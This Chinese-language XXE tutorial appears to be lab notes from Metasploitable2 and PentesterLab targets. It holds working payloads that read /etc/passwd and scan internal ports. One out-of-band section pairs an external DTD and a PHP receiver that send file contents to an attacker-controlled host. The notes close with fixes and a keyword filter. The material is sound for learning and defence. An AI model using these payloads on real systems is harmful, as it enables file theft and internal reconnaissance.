XXE（XML 外部实体注入）漏洞是一种利用 XML 解析器对外部实体的不当处理，通过注入恶意 XML 内容访问服务器上的敏感文件、执行请求或导致拒绝服务的安全漏洞。

## 1 原理

 **`xxe.xml` 文件内部 DTD 定义的结构**

> DTD 用于定义各标签的属性，默认为 `#PCDATA` ，实体标签

xml 文件

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE hello [
<!ELEMENT hello (nb)>
<!ELEMENT nb	(#PCDATA)>
]>
<hello>
    <nb>666</nb>
</hello>
```

| 操作                        | 描述                                      |
| --------------------------- | ----------------------------------------- |
| \<?xml version="1.0"?>      | 定义 `xml` 的版本等信息                   |
| \<!DOCTYPE >                | 声明这是一个用于定义标签属性的 `DTD` 标签 |
| hello [ ]                   | 定义根标签为 `hello`                      |
| \<!ELEMENT hello (nb)>      | 定义根标签 `hello` 下有 `nb` 标签         |
| \<!ELEMENT nb	(#PCDATA)> | 定义 `nb` 标签的属性为 `#PCDATA`          |
| \<hello>                    | 根标签                                    |
| \<nb>                       | 内部标签                                  |
| 666                         | 内容                                      |

浏览器访问 `xxe.xml` 则显示

```xml
<hello>
<nb>666</nb>
</hello>
```

 **xxe.xml 文件外部 DTD 定义的结构**

xml 文件

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE hello SYSTEM "hello.dtd">
<hello>
    <nb>666</nb>
</hello>
```

>`<!DOCTYPE hello SYSTEM "hello.dtd">` 引用外部 DTD `hello.dtd`

外部 DTD文件 `hello.dtd` 调用内部实体

```dtd
<!ELEMENT hello (nb)>
<!ELEMENT nb	(#PCDATA)>
<!ENTITY xxe "ok">
```

>`<!ENTITY xxe"xxe">` 调用 `xxe` 变量，`xxe` 变量定义为 `ok`

外部 DTD文件 `hello.dtd` 调用外部实体

```dtd
<!ELEMENT hello (nb)>
<!ELEMENT nb	(#PCDATA)>
<!ENTITY xxe SYSTEM "xxe.txt">
```

>SYSTEM 调用外部实体 `xxe.txt`

外部实体文件 `xxe.txt`

```
ok
```

**内部 DTD 调用 `xxe.txt`**

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE hello [
<!ELEMENT hello (nb,xxe)>
<!ELEMENT nb	(#PCDATA)>
<!ENTITY xxe SYSTEM "file:///var/www/xxe.txt">
]>
<hello>
    <xxe>&xxe;</xxe>
    <nb>666</nb>
</hello>
```

## 2 演示

在 Metasploitable2-Linux 制作一个有 xxe 漏洞的文件

```php
<?php
$xml=file_get_contents("php://input");
$data = simplexml_load_string($xml) ;
echo "<pre>" ;
print_r($data) ;
echo "</pre>" ;
?>
```

浏览器访问

> http://192.168.1.19/xxe.php

打开 HackBar，在 `Use POST method` 提交 `payload` 调用服务器中的 `passwd` 文件

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE hello [
<!ELEMENT hello (nb,xxe)>
<!ELEMENT nb	(#PCDATA)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<hello>
    <xxe>&xxe;</xxe>
    <nb>666</nb>
</hello>
```

> 注意要用 raw 格式，避免被编码
>
> 能调用什么文件取决于当前用户的权限

> 这里类似于 ssrf，可尝试其它协议，例如 `gopher` 或 `http` 读取任意文件

## 3 漏洞验证

构造 payload

> 可以通过访问 BurpSuite 提供的域名，轮询验证

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE hello [
<!ELEMENT hello (nb,xxe)>
<!ELEMENT nb	(#PCDATA)>
<!ENTITY xxe SYSTEM "http://064hw4p2k6rfw6rirxjug3ym2d84wvkk.oastify.com">
]>
<hello>
    <xxe>&xxe;</xxe>
    <nb>666</nb>
</hello>
```

> 测试时任何页面都可以提交这个 payload，轮询有结果就说明存在漏洞，漏扫工具通常会扫描 xxe 漏洞

## 4 支持协议

php://filter/ 伪协议读取文件

```
php://filter/read=convert.base64-encode/resource=xxe.php
```

> 支持大多数文件格式

http:// 协议端口扫描

```
http://127.0.0.1:80
```

> 若关闭则显示 `Connection refused`
>
> 开启则每种服务反馈的信息不同

http:// 协议漏洞验证

```
http://hello.com
```

## 5 利用 BurpStuite 对目标服务器进行端口扫描

开启拦截，在 HackBar 提交端口扫描 payload

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE hello [
<!ELEMENT hello (nb,xxe)>
<!ELEMENT nb	(#PCDATA)>
<!ENTITY xxe SYSTEM "http://127.0.0.1:80">
]>
<hello>
    <xxe>&xxe;</xxe>
    <nb>666</nb>
</hello>
```

将截取的请求包发送到 `Intruder` ，清除 `payload` 位置

选中端口号添加 `payload` 位置

```
http://127.0.0.1:§80§
```

配置 `payload`

`payload` 类型选择 `数值` 

![payload 类型选择 数值](./../../../../images/XXE/payload%20%E7%B1%BB%E5%9E%8B%E9%80%89%E6%8B%A9%20%E6%95%B0%E5%80%BC.png)

选择端口扫描范围

![选择端口扫描范围](./../../../../images/XXE/%E9%80%89%E6%8B%A9%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%8C%83%E5%9B%B4.png)

取消编码

![取消编码](./../../../../images/XXE/%E5%8F%96%E6%B6%88%E7%BC%96%E7%A0%81.png)

检索含有 `Connection refused` 的响应包

> 若有 `Connection refused` ，则端口未开放

![检索含有 Connection refused 的响应包](./../../../../images/XXE/%E6%A3%80%E7%B4%A2%E5%90%AB%E6%9C%89%20Connection%20refused%20%E7%9A%84%E5%93%8D%E5%BA%94%E5%8C%85.png)

开始攻击后，未检测出 `Connection refused` 的端口就是开放的端口

![开始攻击后，未检测出 Connection refused 的端口就是开放的端口](./../../../../images/XXE/%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB%E5%90%8E%EF%BC%8C%E6%9C%AA%E6%A3%80%E6%B5%8B%E5%87%BA%20Connection%20refused%20%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%B0%B1%E6%98%AF%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3.png)

>`Connection refused` 栏有数值，证明端口关闭

## 6 无回显的情况下实现数据外带

![无回显的情况下实现数据外带](./../../../../images/XXE/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6.png)

**过程**

1.黑客向目标发送一个 XML 请求 payload，使目标向黑客请求 DTD

2.目标向黑客发送一个 DTD 请求，向黑客请求 DTD

3.黑客向目标发送一个 DTD 到目标

4.目标 XML 解析器解析黑客发来的 DTD

5.解析后将数据发送给黑客

**准备**

配置 `PentesterLab-xxe` 虚拟机

切换至站点根目录

```
┌──(root㉿Kali-24)-[~]
└─# cd /var/www/html/
```

在 Kali 配置一个外部 DTD，用于使目标读取数据，并发送给黑客

```
┌──(root㉿Kali-24)-[~]
└─# vim xxe.dtd
```

```dtd
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.1.24/xxe.php?pass=%p1;'>">
%p2;
```

>`% p1` 定义一个参数实体，`%` 和 `p1` 之间有一个空格，用于接收 `file:///etc/passwd` 的内容，`%p1` 引用参数实体，参数实体只能在 `DTD` 文件中被引用。

建立 php 文件用于接收目标发来的数据，并指定存储文件

```
┌──(root㉿Kali-24)-[~]
└─# vim xxe.php
```

```php
<?php
$pass=$_GET['pass'];
file_put_contents('pass.txt',$pass);
?>
```

创建 pass.txt 用于存储数据

```
┌──(root㉿Kali-24)-[~]
└─# touch pass.txt 
```

修改文件权限，以便于数据可以写入

```
┌──(root㉿Kali-24)-[~]
└─# chown -R www-data:www-data /var/www/html/*
```

启动 apache2

```
┌──(root㉿Kali-24)-[~]
└─# systemctl start apache2.service
```

测试 php 文件能否正常写入数据

```
┌──(root㉿Kali-24)-[~]
└─# curl http://192.168.1.24/xxe.php?pass=666
```

查看 pass.txt 文件

```
┌──(root㉿Kali-24)-[/var/www/html]
└─# cat pass.txt
666
```

>成功写入

构造 XML payload 使目标向黑客请求 DTD

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE e1 SYSTEM "http://192.168.1.24/xxe.dtd">
<hello>&e1;</hello>
```

**演示**

浏览器访问目标 `PentesterLab-xxe`

> http://192.168.1.25/login

打开 `BurpSuite` 拦截，在登录界面提交任意字符

查看截获的请求数据包

```http
POST /login HTTP/1.1
Host: 192.168.1.25
Content-Length: 25
Cache-Control: max-age=0
Origin: http://192.168.1.25
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.25/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=123&password=123
```

将 payload 写入请求数据包，修改 `Content-Type` 类型为 xml

```http
POST /login HTTP/1.1
Host: 192.168.1.25
Content-Length: 25
Cache-Control: max-age=0
Origin: http://192.168.1.25
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.25/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0"?>
<!DOCTYPE e1 SYSTEM "http://192.168.1.24/xxe.dtd">
<hello>&e1;</hello>
```

> `Content-Type: text/xml` 用于声明这是一个 xml 文件

## 7 漏洞修复

**升级 libxml 版本**

libxml 2.9.0 以后，默认不解析外部实体

> 有的使用高版本的目标可能需要这个功能，也可能存在这个漏洞

**代码层防御**

PHP：

```
libxml_disable_entity_loader(true);
```

JAVA:

```
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

Python：

```
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

>过滤用户提交的 XML 数据
>关键词：<!DOCTYPE 和<!ENTITY，或者，SYSTEM 和 PUBLIC。
